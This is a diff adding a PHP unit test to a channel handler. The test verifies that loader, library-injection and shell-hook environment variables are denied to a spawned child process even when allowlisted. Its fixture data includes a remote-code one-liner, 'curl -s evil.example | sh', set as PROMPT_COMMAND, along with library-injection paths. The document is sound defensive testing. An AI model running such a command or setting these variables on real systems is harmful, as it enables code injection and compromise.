@@ -374,6 +374,59 @@ final class DefaultChannelHandlerTest extends TestCase
         $this->assertSame(getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin', $capturedEnv['PATH']);
     }
 
+    public function testTheLoaderAndShellHookNamesAreDeniedEvenWhenAllowlisted(): void
+    {
+        $capturedEnv = [];
+        $spy = new class($capturedEnv) implements ChildSpawner {
+            /** @var array<string,string> */
+            private array $captured;
+
+            public function __construct(array &$captured)
+            {
+                $this->captured = &$captured;
+            }
+
+            public function runChild(Session $session, array $cmd, ?array $env = null): int
+            {
+                $this->captured = $env ?? [];
+                return 0;
+            }
+
+            public function signalChild(int $signal): void {}
+        };
+
+        // Every one of these is a name whose value decides what code the
+        // child runs, which library it loads, or where it looks for one.
+        $denied = [
+            'LD_AUDIT'             => '/audit.so',
+            'DYLD_INSERT_LIBRARIES' => '/injected.dylib',
+            'DYLD_LIBRARY_PATH'    => '/tmp/libs',
+            'GCONV_PATH'           => '/tmp/gconv',
+            'PROMPT_COMMAND'       => 'curl -s evil.example | sh',
+            'HOSTALIASES'          => '/tmp/hosts',
+            'POSIXLY_CORRECT'      => '1',
+        ];
+
+        $handler = new DefaultChannelHandler($spy, null, [...\array_keys($denied), 'LOCALE_HINT']);
+        foreach ($denied as $name => $value) {
+            $handler->handleEnv(new EnvMsg($name, $value), $this->fakeSession());
+        }
+        $handler->handleEnv(new EnvMsg('LOCALE_HINT', 'de_DE'), $this->fakeSession());
+        $handler->handleShell(new ShellMsg(wantShell: true), $this->fakeSession());
+
+        foreach (\array_keys($denied) as $name) {
+            $this->assertArrayNotHasKey(
+                $name,
+                $capturedEnv,
+                $name . ' reached the child environment despite the deny-list',
+            );
+        }
+
+        // Negative control: an ordinary allowlisted name still arrives, so
+        // the assertions above are not passing because nothing merged.
+        $this->assertSame('de_DE', $capturedEnv['LOCALE_HINT'] ?? null);
+    }
+
     public function testBuildEnvPassesAllowlistedVars(): void
     {
         $capturedEnv = [];
